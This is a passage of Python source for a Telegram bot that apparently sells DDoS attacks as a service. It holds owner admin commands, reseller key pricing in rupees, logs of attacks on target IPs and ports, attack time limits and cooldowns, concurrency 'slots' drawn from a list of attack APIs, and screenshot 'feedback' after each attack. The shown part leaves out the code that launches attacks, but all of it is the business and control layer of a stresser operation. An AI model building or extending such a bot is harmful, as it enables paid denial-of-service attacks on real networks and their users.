        response += f"Username: @{resolved_name}\n"
    if bot_user:
        if bot_user.get('first_name'):
            response += f"Name: {bot_user.get('first_name')}\n"
        if bot_user.get('first_seen'):
            response += f"First Seen: {bot_user['first_seen'].strftime('%d-%m-%Y %H:%M')}\n"
    if target_user_id == BOT_OWNER:
        response += "\nRole: OWNER\n"
    elif reseller:
        response += f"\nRole: RESELLER\nBalance: {reseller.get('balance', 0)} Rs\nKeys Generated: {reseller.get('total_keys_generated', 0)}\nStatus: {'Blocked' if reseller.get('blocked') else 'Active'}\n"
    else:
        response += "\nRole: USER\n"
    if user:
        response += "\n=========\nKEY DETAILS\n=========\n\n"
        if user.get('banned'):
            response += "STATUS: BANNED\n"
        if user.get('key'):
            response += f"Key: <code>{user['key']}</code>\nDuration: {user.get('key_duration_label', 'N/A')}\n"
            if user.get('redeemed_at'):
                response += f"Redeemed: {user['redeemed_at'].strftime('%d-%m-%Y %H:%M')}\n"
            if user.get('key_expiry'):
                if user['key_expiry'] > datetime.now():
                    remaining = user['key_expiry'] - datetime.now()
                    days = remaining.days
                    hours, rem = divmod(remaining.seconds, 3600)
                    mins, secs = divmod(rem, 60)
                    response += f"Remaining: {days}d {hours}h {mins}m\nExpires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\nStatus: ACTIVE\n"
                else:
                    response += f"Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\nStatus: EXPIRED\n"
            if user.get('reseller_username'):
                response += f"Reseller: @{user['reseller_username']}\n"
        else:
            response += "No Active Key\n"
    else:
        response += "\nNo Key History\n"
    user_keys = list(keys_collection.find({'used_by': target_user_id}).sort('used_at', -1).limit(5))
    if user_keys:
        response += "\n=========\nKEY HISTORY (Last 5)\n=========\n\n"
        for k in user_keys:
            response += f"- {k.get('duration_label', 'N/A')}"
            if k.get('used_at'):
                response += f" ({k['used_at'].strftime('%d-%m-%Y')})"
            response += "\n"
    attack_count = attack_logs_collection.count_documents({'user_id': target_user_id})
    user_attacks = list(attack_logs_collection.find({'user_id': target_user_id}).sort('timestamp', -1).limit(10))
    response += "\n=========\nATTACK STATS\n=========\n\n"
    response += f"Total Attacks: {attack_count}\n"
    if user_attacks:
        response += "\nRecent Attacks:\n"
        for i, atk in enumerate(user_attacks[:5], 1):
            response += f"{i}. {atk['target']} {atk['port']} ({atk['duration']}s)\n"
            if atk.get('timestamp'):
                response += f"   {atk['timestamp'].strftime('%d-%m-%Y %H:%M')}\n"
    fb = get_pending_feedback(target_user_id)
    if fb:
        response += "\nPending Feedback: YES\n"
    response += "\n========="
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    threads = process.num_threads()
    cpu_overall = psutil.cpu_percent(interval=0.1)
    ram = psutil.virtual_memory()
    ram_used = ram.used / 1024 / 1024
    ram_total = ram.total / 1024 / 1024
    ram_percent = ram.percent
    disk = psutil.disk_usage('/')
    disk_percent = disk.percent
    import platform
    system_info = f"{platform.system()} {platform.release()}"
    total_users = users_collection.count_documents({})
    active_users = users_collection.count_documents({'key_expiry': {'$gt': datetime.now()}})
    online_threshold = datetime.now() - timedelta(minutes=5)
    online_users = bot_users_collection.count_documents({'last_seen': {'$gt': online_threshold}})
    total_resellers = resellers_collection.count_documents({})
    active_keys = keys_collection.count_documents({'used': False})
    total_keys = keys_collection.count_documents({})
    active_count = get_active_attack_count()
    max_concurrent = len(API_LIST)
    maint_status = "Enabled" if is_maintenance() else "Disabled"
    channel_status = "REQUIRED" if get_channel_required() else "Not Required"
    ddos_status = "ON" if get_ddos_protection() else "OFF"
    group_count = len(get_approved_groups())
    reel_count = len(get_reel_list())
    reel_status = "ON" if get_reel_enabled() else "OFF"
    feedback_status = "ON" if get_feedback_enabled() else "OFF"
    response = "SERVER STATS\n============\n\n"
    response += f"BOT INFO\n- Uptime: {uptime_str}\n- Memory: {memory_mb:.1f} MB\n- CPU: {cpu_percent:.1f}%\n- Threads: {threads}\n\n"
    response += f"SYSTEM\n- {system_info}\n- CPU: {cpu_overall:.1f}% overall\n- RAM: {ram_percent:.1f}% ({ram_used:.0f}MB/{ram_total:.0f}MB)\n- Disk: {disk_percent:.1f}%\n\n"
    response += f"- Active Attacks: {active_count}/{max_concurrent}\n- Maintenance: {maint_status}\n- Channel: {channel_status}\n- DDoS: {ddos_status}\n- Groups: {group_count}\n- Reels: {reel_count} ({reel_status})\n- Feedback: {feedback_status}\n\n"
    response += f"DATA\n- Total Users: {total_users}\n- Active Users (Keys): {active_users}\n- Online Users: {online_users}\n- Resellers: {total_resellers}\n- Available Keys: {active_keys}\n- Total Keys: {total_keys}\n\n"
    response += f"SETTINGS\n- Private Max Time: {get_private_max_attack_time()}s\n- Group Max Time: {get_group_max_attack_time()}s\n- Private Cooldown: {get_private_cooldown()}s\n- Group Cooldown: {get_group_cooldown()}s"
    response += "\n\n============"
    bot.reply_to(message, response)

@bot.message_handler(commands=["setprice"])
def set_price_command(message):
    global RESELLER_PRICING
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        response = "CURRENT PRICING\n===============\n\n"
        for dur, info in RESELLER_PRICING.items():
            response += f"- {dur}: {info['price']} Rs ({info['label']})\n"
        response += "\nUsage: /setprice <duration> <price>\nExample: /setprice 1d 60"
        bot.reply_to(message, response)
        return
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /setprice <duration> <price>")
        return
    duration_key = command_parts[1].lower()
    if duration_key not in RESELLER_PRICING:
        bot.reply_to(message, "Invalid duration! Valid: 12h, 1d, 3d, 7d, 30d, 60d")
        return
    try:
        new_price = int(command_parts[2])
        if new_price < 0:
            bot.reply_to(message, "Price 0 se kam nahi ho sakta!")
            return
    except:
        bot.reply_to(message, "Invalid price!")
        return
    old_price = RESELLER_PRICING[duration_key]['price']
    RESELLER_PRICING[duration_key]['price'] = new_price
    set_setting(f'price_{duration_key}', new_price)
    update_reseller_pricing()
    bot.reply_to(message, f"Price Updated!\n{RESELLER_PRICING[duration_key]['label']}\nOld: {old_price} Rs\nNew: {new_price} Rs")

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    all_logs = list(attack_logs_collection.find().sort('timestamp', -1))
    if not all_logs:
        bot.reply_to(message, "Koi attack logs nahi hai!")
        return
    content = "ATTACK LOGS REPORT\n"
    content += f"Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n\nTotal Attacks: {len(all_logs)}\n\n--------------------\n"
    for i, log in enumerate(all_logs, 1):
        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n   Target: {log.get('target', 'N/A')} {log.get('port', 'N/A')}\n   Duration: {log.get('duration', 'N/A')}s\n"
        if log.get('timestamp'):
            content += f"   Time: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
        content += "\n"
    content += "--------------------\nEND OF LOGS"
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"attack_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    bot.send_document(message.chat.id, file, caption=f"Attack Logs\n\nTotal Attacks: {len(all_logs)}")

@bot.message_handler(commands=["del_logs"])
def delete_logs_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    count = attack_logs_collection.count_documents({})
    if count == 0:
        bot.reply_to(message, "Koi logs nahi hai!")
        return
    attack_logs_collection.delete_many({})
    bot.reply_to(message, f"{count} attack logs delete ho gaye!")

@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /block_ip <ip_prefix>\nExample: /block_ip 96.")
        return
    ip_prefix = command_parts[1]
    if add_blocked_ip(ip_prefix):
        bot.reply_to(message, f"IP Blocked!\nPrefix: {ip_prefix}*")
    else:
        bot.reply_to(message, f"{ip_prefix} already blocked!")

@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /unblock_ip <ip_prefix>")
        return
    ip_prefix = command_parts[1]
    if remove_blocked_ip(ip_prefix):
        bot.reply_to(message, f"IP Unblocked!\nPrefix: {ip_prefix}")
    else:
        bot.reply_to(message, f"{ip_prefix} not found!")

@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    blocked = get_blocked_ips()
    if not blocked:
        bot.reply_to(message, "Koi IP blocked nahi hai!")
        return
    response = "BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. {ip}*\n"
    response += f"\nTotal: {len(blocked)}"
    bot.reply_to(message, response)

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    if not is_owner(message.from_user.id):
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "Usage: /maintenance <message>")
        return
    msg = command_parts[1]
    set_maintenance(True, msg)
    bot.reply_to(message, f"Maintenance ON!\nMessage: {msg}\n\n/ok to turn off")

@bot.message_handler(commands=["ok"])
def ok_command(message):
    if not is_owner(message.from_user.id):
        return
    if not is_maintenance():
        bot.reply_to(message, "Maintenance already OFF!")
        return
    set_maintenance(False)
    bot.reply_to(message, "Maintenance OFF!\nBot normal hai.")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    if is_owner(user_id):
        response = f'''👑 Welcome Owner, {user_name}!

🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
📢 Channel: {'✅ REQUIRED' if get_channel_required() else '❌ NOT REQUIRED'}
📢 Groups: {len(get_approved_groups())}
🔢 Max Slots: {len(API_LIST)}
🎬 Reel: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)
📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}
⚙️ Setup: /setupstatus

⚡ Private: Max {get_private_max_attack_time()}s | CD {get_private_cooldown()}s
⚡ Groups: Max {get_group_max_attack_time()}s | CD {get_group_cooldown()}s

Use /help for commands.
Use /settings for settings.'''
    elif is_reseller(user_id):
        response = f'''💼 Welcome Reseller, {user_name}!

💰 Balance: /mysaldo
🔑 Generate Keys: /gen <duration> <count>
💵 Pricing: /prices
⚡ Attack: /attack
📊 Status: /status
📦 My Key: /mykey
🔑 Redeem: /redeem
🆔 ID: /id
🏓 Ping: /ping

🔢 Max Slots: {len(API_LIST)}

Use /help for full commands.'''
    else:
        response = '''╭━━━〔 💎 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 ━━╮
┃
┃  ◈  ⚡  /attack
┃  ◈  📊  /status
┃  ◈  📦  /mykey
┃  ◈  🔑  /redeem
┃  ◈  ✅  /verify
┃  ◈  🆔  /id
┃
╰━━━━━━━━━━━━━━╯

╭━━━━━━〔 ⚙️ 𝗦𝗘𝗧𝗨𝗣 〕━━━━╮
┃
┃  ◈  📦  /canary
┃  ◈  🍎  /ios
┃  ◈  🤖  /android
┃
╰━━━━━━━━━━━━━━━━━━╯

╭━━━━━〔 👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 〕━━━━╮
┃  𝗙𝗔𝗦𝗧  •  💎 𝗣𝗥𝗢 • 𝗦𝗘𝗖𝗨𝗥𝗘
╰━━━━━━━━━━━━━━━━ ━━━╯'''
    bot.reply_to(message, response)

@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return
    if not get_feedback_enabled():
        return
    fb = get_pending_feedback(user_id)
    if not fb:
        return
    clear_pending_feedback(user_id)
    user_name = message.from_user.first_name
    username = message.from_user.username
    bot.reply_to(message, f"Feedback Received!\nTarget: {fb['target']} {fb['port']} Duration: {fb['duration']}s\n\nAb naya attack laga sakte ho!")
    try:
        photo = message.photo[-1]
        file_id = photo.file_id
        owner_msg = f"New Feedback\nUser: {user_name}\n@{username if username else 'N/A'}\nID: {user_id}\nTarget: {fb['target']} {fb['port']}\nDuration: {fb['duration']}s"
        bot.send_photo(BOT_OWNER, file_id, caption=owner_msg)
    except Exception as e:
        print(f"Feedback forward error: {e}")

@bot.message_handler(content_types=['document', 'video', 'text', 'audio', 'voice', 'sticker'])
def handle_other_feedback(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return
    if not get_feedback_enabled():
        return
    fb = get_pending_feedback(user_id)
    if fb:
        content_type = message.content_type
        if content_type == 'text':
            if message.text and message.text.startswith('/'):
                return
            bot.reply_to(message, f"Send screenshot (photo), not text!\nTarget: {fb['target']} {fb['port']} Duration: {fb['duration']}s")
        else:
            clear_pending_feedback(user_id)
            user_name = message.from_user.first_name
            username = message.from_user.username
            bot.reply_to(message, f"Feedback Received!\nTarget: {fb['target']} {fb['port']} Duration: {fb['duration']}s\n\nAb naya attack laga sakte ho!")
            try:
                owner_msg = f"New Feedback\nUser: {user_name}\n@{username if username else 'N/A'}\nID: {user_id}\nTarget: {fb['target']} {fb['port']}\nDuration: {fb['duration']}s"
                if content_type == 'document':
                    bot.send_document(BOT_OWNER, message.document.file_id, caption=owner_msg)
                elif content_type == 'video':
                    bot.send_video(BOT_OWNER, message.video.file_id, caption=owner_msg)
                elif content_type == 'audio':
                    bot.send_audio(BOT_OWNER, message.audio.file_id, caption=owner_msg)
                elif content_type == 'voice':
                    bot.send_voice(BOT_OWNER, message.voice.file_id, caption=owner_msg)
                elif content_type == 'sticker':
                    bot.send_sticker(BOT_OWNER, message.sticker.file_id)
                    bot.send_message(BOT_OWNER, owner_msg)
                else:
                    bot.send_message(BOT_OWNER, owner_msg)
            except Exception as e:
                print(f"Feedback forward error: {e}")

def load_saved_channels():
    global REQUIRED_CHANNELS, REQUIRED_CHANNEL_USERNAMES
    try:
        saved = get_setting('required_channels', None)
        if saved and isinstance(saved, list) and saved:
            REQUIRED_CHANNELS = saved
            REQUIRED_CHANNEL_USERNAMES = [extract_channel_username(ch) for ch in saved]
            print(f"Loaded {len(REQUIRED_CHANNELS)} required channels from database")
    except Exception as e:
        print(f"Error loading channels: {e}")

load_saved_channels()
protection.enabled = get_ddos_protection()

print("BOT STARTING...", flush=True)
print(f"API: {API_BASE}", flush=True)
print(f"API Key: {API_KEY[:20]}...", flush=True)
print(f"DDoS Protection: {'ON' if get_ddos_protection() else 'OFF'}", flush=True)
print(f"Channel Required: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}", flush=True)
print(f"Approved Groups: {len(get_approved_groups())}", flush=True)
print(f"Private Max Time: {get_private_max_attack_time()}s", flush=True)
print(f"Group Max Time: {get_group_max_attack_time()}s", flush=True)
print(f"Private Cooldown: {get_private_cooldown()}s", flush=True)
print(f"Group Cooldown: {get_group_cooldown()}s", flush=True)
print(f"Max Concurrent Slots: {len(API_LIST)}", flush=True)
print(f"Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)", flush=True)
print(f"Feedback Feature: {'ON' if get_feedback_enabled() else 'OFF'}", flush=True)
print("=" * 50, flush=True)

print("Removing any existing webhook...", flush=True)
try:
    bot.remove_webhook()
    print("Webhook removed successfully!", flush=True)
except Exception as e:
    print(f"Webhook removal error: {e}", flush=True)

time.sleep(3)

def run_health_server():
    try:
        from http.server import HTTPServer, BaseHTTPRequestHandler
        port = int(os.getenv("PORT", "8080"))
        class HealthHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Bot is running!")
            def log_message(self, format, *args):
                pass
        server = HTTPServer(('0.0.0.0', port), HealthHandler)
        print(f"Health check server started on port {port}", flush=True)
        server.serve_forever()
    except Exception as e:
        print(f"Health server error: {e}", flush=True)

health_thread = threading.Thread(target=run_health_server, daemon=True)
health_thread.start()

retry_count = 0
while True:
    try:
        print("Starting bot polling...", flush=True)
        bot.polling(none_stop=True, interval=0, timeout=20)
        retry_count = 0
    except Exception as e:
        error_str = str(e)
        retry_count += 1
        print(f"Polling crashed (attempt #{retry_count}): {e}", flush=True)
        if "409" in error_str or "Conflict" in error_str:
            print("409 Conflict detected! Removing webhook & waiting...", flush=True)
            try:
                bot.remove_webhook()
                print("Webhook removed on retry", flush=True)
            except Exception as we:
                print(f"Webhook removal failed: {we}", flush=True)
            wait_time = min(60, 15 + retry_count * 5)
            print(f"Waiting {wait_time}s before retry...", flush=True)
            time.sleep(wait_time)
        else:
            print("Restarting in 5s...", flush=True)
            time.sleep(5)